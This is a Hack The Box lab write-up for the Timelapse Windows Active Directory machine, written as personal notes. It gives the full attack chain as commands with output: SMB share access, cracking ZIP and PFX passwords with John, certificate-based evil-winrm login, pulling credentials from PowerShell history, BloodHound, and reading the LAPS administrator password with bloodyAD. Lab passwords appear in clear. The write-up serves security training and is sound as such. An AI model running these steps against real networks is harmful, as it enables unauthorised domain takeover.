# 🎯 HTB_Lab_AD_Timelapse

> [!info]- Machine Overview
> | Machine Info | Details |
> | --- | --- |
> | **IP Address** | `10.10.11.152` |
> | **Operating System** | Windows |
> | **Difficulty** | Easy |
> | **Status** | 📋 Todo |
> | **Points** | 20 |
> | **Time Spent** | TBD |

---
## 🚀 Executive Summary

> [!cite] Cite form HTB
Timelapse is an Easy Windows machine that involves accessing a publicly accessible SMB share containing a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted PFX file, which can be cracked with John as well, by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration indicates that svc_deploy is part of the LAPS_Readers group. The `LAPS_Readers` group can manage passwords in LAPS, and any user in this group can read the local passwords for machines in the domain. By abusing this trust, we retrieve the Administrator password and gain a WinRM session.

---

# Attack Path

```mermaid
%%{init: {'theme':'base', 'themeVariables': { 'primaryColor':'#f2e9e1','primaryTextColor':'#575279','primaryBorderColor':'#b4637a','lineColor':'#286983','secondaryColor':'#fffaf3','tertiaryColor':'#faf4ed','background':'#faf4ed','mainBkg':'#faf4ed','secondBkg':'#fffaf3','lineColor':'#286983','border1':'#286983','border2':'#907aa9','arrowheadColor':'#286983','fontSize':'16px','fontFamily':'sans-serif'}}}%%

flowchart TD
    Start[💻 <b>Initial Recon</b><br/>HTB Timelapse]
    
    Nmap[📡 Nmap/Rustscan<br/>Port Scan]
    
    SMB[🌐 SMB Enumeration<br/>Found Shares]
    
    Download[⬇️ Download<br/>winrm_backup.zip]
    
    Crack1[🔓 John the Ripper<br/>Crack ZIP Password]
    
    Cred1[🔑 Password Found<br/>supremelegacy]
    
    Extract1[📦 Extract PFX<br/>legacyy_dev_auth.pfx]
    
    Crack2[🔓 John the Ripper<br/>Crack PFX Password]
    
    Cred2[🔑 Password Found<br/>thuglegacy]
    
    OpenSSL[📜 OpenSSL Extract<br/>cert.pem + key.pem]
    
    WinRM1[💻 Evil-WinRM<br/>User: legacyy]
    
    PSHist[📝 PowerShell History<br/>ConsoleHost_history.txt]
    
    Cred3[👤 Credentials Found<br/>svc_deploy]
    
    BloodHound[🔍 BloodHound<br/>AD Enumeration]
    
    LAPS[👥 LAPS_Readers<br/>Group Membership]
    
    Bloody[☠️ BloodyAD<br/>Extract LAPS Password]
    
    Admin[👑 Administrator<br/>WK4T7631vJaz...]
    
    WinRM2[🚀 Evil-WinRM<br/>Administrator Access]
    
    Pwned[🏆 <b>PWNED</b><br/>Root Flag]

    Start --> Nmap
    Nmap -->|Port 445 Open| SMB
    SMB -->|\\Shares Found| Download
    Download --> Crack1
    Crack1 --> Cred1
    Cred1 --> Extract1
    Extract1 --> Crack2
    Crack2 --> Cred2
    Cred2 --> OpenSSL
    OpenSSL -->|Certificates| WinRM1
    WinRM1 --> PSHist
    PSHist --> Cred3
    Cred3 --> BloodHound
    BloodHound -->|Path to DA| LAPS
    LAPS --> Bloody
    Bloody --> Admin
    Admin --> WinRM2
    WinRM2 --> Pwned

    classDef startEnd fill:#d7827e,stroke:#b4637a,stroke-width:3px,color:#575279
    classDef process fill:#d4e7eb,stroke:#286983,stroke-width:2px,color:#575279
    classDef exploit fill:#f5dda9,stroke:#ea9d34,stroke-width:2px,color:#575279
    classDef credential fill:#dfd3e8,stroke:#907aa9,stroke-width:2px,color:#575279

    class Start,Pwned startEnd
    class Nmap,SMB,Download,Extract1,OpenSSL,PSHist,LAPS process
    class Crack1,Crack2,WinRM1,BloodHound,Bloody,WinRM2 exploit
    class Cred1,Cred2,Cred3,Admin credential

```


## 🔬 Reconnaissance & Enumeration

###  Network Scanning `ris:Radar`

> [!success]
> > [!tip] Command
> > #### Rustscan - Nmap `ris:Scan`
> > ```bash
> > rustscan -a 10.10.11.152 --ulimit 5000 -r 1-65535 -- -sCV -oA HTB_LAB_AD_TIMESAPSE
> > ```
> 
> > [!example]- Results
> > #### Nmap Results `ris:Scan2`
> > ```bash
> > NSE: Loaded 157 scripts for scanning.
> > NSE: Script Pre-scanning.
> > NSE: Starting runlevel 1 (of 3) scan.
> > Initiating NSE at 01:12
> > Completed NSE at 01:12, 0.00s elapsed
> > NSE: Starting runlevel 2 (of 3) scan.
> > Initiating NSE at 01:12
> > Completed NSE at 01:12, 0.00s elapsed
> > NSE: Starting runlevel 3 (of 3) scan.
> > Initiating NSE at 01:12
> > Completed NSE at 01:12, 0.00s elapsed
> > Initiating Ping Scan at 01:12
> > Scanning 10.10.11.152 [4 ports]
> > Completed Ping Scan at 01:12, 0.05s elapsed (1 total hosts)
> > Initiating SYN Stealth Scan at 01:12
> > Scanning DC01.timelapse.htb (10.10.11.152) [15 ports]
> > Discovered open port 139/tcp on 10.10.11.152
> > Discovered open port 445/tcp on 10.10.11.152
> > Discovered open port 593/tcp on 10.10.11.152
> > Discovered open port 49674/tcp on 10.10.11.152
> > Discovered open port 464/tcp on 10.10.11.152
> > Discovered open port 135/tcp on 10.10.11.152
> > Discovered open port 636/tcp on 10.10.11.152
> > Discovered open port 49673/tcp on 10.10.11.152
> > Discovered open port 53/tcp on 10.10.11.152
> > Discovered open port 49719/tcp on 10.10.11.152
> > Discovered open port 5986/tcp on 10.10.11.152
> > Discovered open port 9389/tcp on 10.10.11.152
> > Discovered open port 88/tcp on 10.10.11.152
> > Discovered open port 49693/tcp on 10.10.11.152
> > Discovered open port 49667/tcp on 10.10.11.152
> > Completed SYN Stealth Scan at 01:12, 0.09s elapsed (15 total ports)
> > Initiating Service scan at 01:12
> > Scanning 15 services on DC01.timelapse.htb (10.10.11.152)
> > Completed Service scan at 01:13, 54.29s elapsed (15 services on 1 host)
> > NSE: Script scanning 10.10.11.152.
> > NSE: Starting runlevel 1 (of 3) scan.
> > Initiating NSE at 01:13
> > NSE Timing: About 99.95% done; ETC: 01:14 (0:00:00 remaining)
> > Completed NSE at 01:14, 40.13s elapsed
> > NSE: Starting runlevel 2 (of 3) scan.
> > Initiating NSE at 01:14
> > Completed NSE at 01:14, 1.45s elapsed
> > NSE: Starting runlevel 3 (of 3) scan.
> > Initiating NSE at 01:14
> > Completed NSE at 01:14, 0.00s elapsed
> > Nmap scan report for DC01.timelapse.htb (10.10.11.152)
> > Host is up, received echo-reply ttl 127 (0.034s latency).
> > Scanned at 2025-12-05 01:12:51 GMT for 96s
> > 
> > PORT      STATE SERVICE       REASON          VERSION
> > 53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
> > 88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-05 09:12:57Z)
> > 135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
> > 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
> > 445/tcp   open  microsoft-ds? syn-ack ttl 127
> > 464/tcp   open  kpasswd5?     syn-ack ttl 127
> > 593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
> > 636/tcp   open  tcpwrapped    syn-ack ttl 127
> > 5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> > | tls-alpn:
> > |_  http/1.1
> > |_http-server-header: Microsoft-HTTPAPI/2.0
> > | ssl-cert: Subject: commonName=dc01.timelapse.htb
> > | Issuer: commonName=dc01.timelapse.htb
> > | Public Key type: rsa
> > | Public Key bits: 2048
> > | Signature Algorithm: sha256WithRSAEncryption
> > | Not valid before: 2021-10-25T14:05:29
> > | Not valid after:  2022-10-25T14:25:29
> > | MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
> > | SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
> > | -----BEGIN CERTIFICATE-----
> > | MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
> > | MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
> > | MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
> > | MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
> > | rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
> > | LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
> > | AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
> > | isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
> > | FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
> > | AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
> > | HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
> > | /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
> > | 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
> > | NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
> > | 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
> > | 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
> > | lrrndm32+d0YeP/wb8E=
> > |_-----END CERTIFICATE-----
> > |_http-title: Not Found
> > |_ssl-date: 2025-12-05T09:14:26+00:00; +7h59m59s from scanner time.
> > 9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
> > 49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
> > 49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
> > 49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
> > 49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
> > 49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
> > Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
> > 
> > Host script results:
> > | smb2-time:
> > |   date: 2025-12-05T09:13:47
> > |_  start_date: N/A
> > | smb2-security-mode:
> > |   3:1:1:
> > |_    Message signing enabled and required
> > |_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
> > | p2p-conficker:
> > |   Checking for Conficker.C or higher...
> > |   Check 1 (port 32357/tcp): CLEAN (Timeout)
> > |   Check 2 (port 54402/tcp): CLEAN (Timeout)
> > |   Check 3 (port 22941/udp): CLEAN (Timeout)
> > |   Check 4 (port 24996/udp): CLEAN (Timeout)
> > |_  0/4 checks are positive: Host is CLEAN or ports are blocked
> > 
> > NSE: Script Post-scanning.
> > NSE: Starting runlevel 1 (of 3) scan.
> > Initiating NSE at 01:14
> > Completed NSE at 01:14, 0.00s elapsed
> > NSE: Starting runlevel 2 (of 3) scan.
> > Initiating NSE at 01:14
> > Completed NSE at 01:14, 0.00s elapsed
> > NSE: Starting runlevel 3 (of 3) scan.
> > Initiating NSE at 01:14
> > Completed NSE at 01:14, 0.00s elapsed
> > Read data files from: /usr/share/nmap
> > Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> > Nmap done: 1 IP address (1 host up) scanned in 96.41 seconds
> >            Raw packets sent: 19 (812B) | Rcvd: 16 (688B)
> > ```
> 

----

**Key Findings:**
- [ ] Open Ports: **53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,49719**
- [ ] Interesting Services: *SMB*
- [ ] Potential Entry Points: *SMB Shares*

---
### SMB
> [!summary]
> 
> > [!done]- SMBClient Shares `ris:ShareBox`
> > ### SMB Shares Enumeration `ris:ShareBox`
> > **Command**: `ris:Command`
> > ```bash
> > smbclient -L //10.10.11.152
> > ```
> > 
> > **Results**: `ris:Article`
> > ```bash
> > smbclient -L //10.10.11.152/
> > Password for [WORKGROUP\kali]:
> > 
> > 	Sharename       Type      Comment
> > 	---------       ----      -------
> > 	ADMIN$          Disk      Remote Admin
> > 	C$              Disk      Default share
> > 	IPC$            IPC       Remote IPC
> > 	NETLOGON        Disk      Logon server share
> > 	Shares          Disk
> > 	SYSVOL          Disk      Logon server share
> > Reconnecting with SMB1 for workgroup listing.
> > do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
> > Unable to connect with SMB1 -- no workgroup available
> > ```
> 
> > [!tip]- SMBClient Get `ris:Download`
> > ### Downloading `winrm_backup.zip` `ris:FileZip`
> > ```bash
> > smbclient //timelapse.htb/shares
> > smb: \> ls
> > smb: \> cd Dev
> > smb: \Dev\> get winrm_backup.zip
> > ```
> > 
> > 


-----
## PFX File `ris:ShieldStar`

To access the PFX file, we need to unzip the file we just downloaded. However, it has a password, and the unzipped PFX file does as well. We will use `JohnTheRipper` to crack the passwords on these files

> [!success]
> ### Cracking the ZIP file `ris:FolderZip`
> **zip2john** `ris:Archive`
> ```bash
> zip2john winrm_backup.zip > zip_winrm.john
> 
> 
> ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
> ```
> 
> **Command** `ris:Command`
> ```bash
> john winrm_backup.zip --wordlist:/usr/share/wordlists/rockyou.txt
> ```
> 
> **Output** `ris:Article`
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (PKZIP [32/64])
> Will run 4 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
> 1g 0:00:00:00 DONE (2025-12-05 03:15) 4.000g/s 14155Kp/s 14155Kc/s 14155KC/s tabatha916..stefronc
> ```
> > Password for ZIP: `supremelegacy`
> 
> ```bash
> unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
> ```

> [!success]
> ### Cracking PFX with John `ris:LockPassword`
> So by using the following command, I found out that the PFX file is also password-protected
> 
> 
> 
> **Commands**: `ris:Command`
> ```bash
> pfx2john legacyy_dev_auth.pfx > pfx.john
> 
> john pfx.john --wordlist:/usr/share/wordlists/rockyou.txt
> ```
> 
> **Output**: `ris:Article`
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
> Cost 1 (iteration count) is 2000 for all loaded hashes
> Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
> Will run 4 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> thuglegacy       (legacyy_dev_auth.pfx)
> 1g 0:00:01:38 DONE (2025-12-05 04:11) 0.01013g/s 32749p/s 32749c/s 32749C/s thyriana..thsco04
> ```

### Extracting cert.pem / key.pem

> 	By using the thuglegacy password, we can now extract the *key.pem* and *cert.pem* from the PFX file. We can use the tool `openssl` to extract them. After we do that, we can then use them to WinRM to the user legacyy

Extracting the .pem files from the .pfx file
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

### Initial Access
Now we can use evil-winrm to establish a connection. 
```bash
evil-winrm -i $target -c cert.pem -k key.pem -S
```


Now that we have looked, you can look at the PowerShell history log, which can usually be found at this location `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

But it's good practice to run enumeration and privilege-escalation tools like winPEAS on Windows systems or networks, and linPEAS on Linux systems or networks. 
Both of which can be found [here](https://github.com/peass-ng/PEASS-ng). It won't work on every system, but it's good practice to try, especially if you plan to go through a lab without looking at writeups etc

Following the [[Windows Emumeration]] Cheat sheet we will eventually come to the powershell history command. We can use the following command to find the following user and their password

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

So we now have the username and password of an important account on the Windows Active Directory server

```text
svc_deploy
E3R$Q62^12p7PLlC%KWaxuaV
```

### Bloodhound Enumeration
Using the username and password, let's enumerate this network with BloodHound CE Python. When that is done, we upload the zip to BloodHound Community Edition. 

```bash
bloodhound-ce-python -c all -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb -ns 10.10.11.152 --zip
```

upload the zip to bloodhoun community edition. when its been uploaded search for `svc_deploy`

the following photos will explain how to find the path to getting the DC admin. 


As you can see from the data we captured and found using the Bloodhound toolset, it tells us we can use the tool Blood [[BloodyAD]] to grab the LAPS password.

```bash
bloodyAD --host 10.10.11.152 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get object 'DC01$' --attr ms-Mcs-AdmPwd
```


And just like that, we have the DC01 password, which we can now use to connect to the admin to get the last flag

```bash
evil-winrm -i 10.10.11.152 -u administrator -p "WK4T7631vJaz,+187aCDsrs{" -S
```


### Shell As Admin
##  Credentials & Secrets Discovered `ris:Key`

| Type | Username | Password/Hash | Location | Notes |
|------|----------|---------------|----------|-------|
| SSH  |          |               |          |       |
| DB   |          |               |          |       |
| Web  |          |               |          |       |

> [!warning] Password Cracking
> ```bash
> # Hash cracking with hashcat
> hashcat -m <hash-mode> hash.txt /usr/share/wordlists/rockyou.txt
> 
> # John the Ripper
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> ```

---

## 📊 Related Boxes (Dataview)

> [!note]- Other Windows Boxes
> ```dataview
> TABLE difficulty, ip, status
> FROM #HTB/OS/Windows AND !"00_Meta"
> WHERE file.name != this.file.name
> SORT difficulty ASC
> ```

---

## 🗂️ Attachments

- [[HTB_Lab_AD_Timelapse-Screenshots]]
- [[HTB_Lab_AD_Timelapse-Scripts]]
- [[HTB_Lab_AD_Timelapse-Attack-Flow.excalidraw]]

---

**Last Updated:** 2025-12-03 01:25
**Writeup Author:** Netrunner
